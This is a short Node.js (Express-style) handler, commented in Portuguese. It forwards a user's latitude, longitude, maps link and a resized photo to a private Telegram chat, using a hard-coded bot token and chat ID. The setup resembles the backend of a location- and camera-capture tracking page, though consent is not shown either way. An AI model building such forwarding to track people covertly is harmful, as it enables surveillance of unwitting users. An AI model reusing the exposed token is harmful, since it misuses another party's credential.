const http = require("http");
const https = require("https");
const axios = require("axios");
const FormData = require("form-data");
const sharp = require("sharp");

// Suas constantes do bot e chat
const TELEGRAM_BOT_TOKEN = "7674928346:AAEd6FNCSB_ozfmqs7islmmEaH6x8bWivVQ";
const TELEGRAM_CHAT_ID = "1276935257";

// Exemplo de função que seria seu endpoint POST (express)
async function enviarDados(req, res) {
  const { latitude, longitude, maps, photo } = req.body;

  // Força IPv4 criando agentes http e https com family 4
  const httpAgent = new http.Agent({ family: 4 });
  const httpsAgent = new https.Agent({ family: 4 });

  try {
    // Envia mensagem de localização
    const message = `📍 Localização do usuário:\nLatitude: ${latitude}\nLongitude: ${longitude}\n${maps}`;
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      },
      {
        httpAgent,
        httpsAgent,
      }
    );

    if (photo) {
      try {
        // Remove o prefixo da base64
        const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
        const buffer = Buffer.from(base64Data, "base64");

        // Redimensiona a imagem para no máximo 800x600 (mantendo proporção)
        const resizedBuffer = await sharp(buffer)
          .resize({ width: 800, height: 600, fit: "inside" })
          .png()
          .toBuffer();

        const form = new FormData();
        form.append("chat_id", TELEGRAM_CHAT_ID);
        form.append("photo", resizedBuffer, {
          filename: "photo.png",
          contentType: "image/png",
        });

        // Envia foto com os headers corretos e agentes IPv4
        await axios.post(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
          form,
          {
            headers: form.getHeaders(),
            httpAgent,
            httpsAgent,
          }
        );
      } catch (imgError) {
        console.error("Erro ao processar a imagem:", imgError);
        return res.status(500).json({ success: false, message: "Erro ao processar a imagem." });
      }
    }

    res.json({ success: true });
  } catch (error) {
    console.error("Erro ao enviar para Telegram:", error.response?.data || error.message || error);
    res.status(500).json({ success: false, message: "Erro ao enviar os dados." });
  }
}

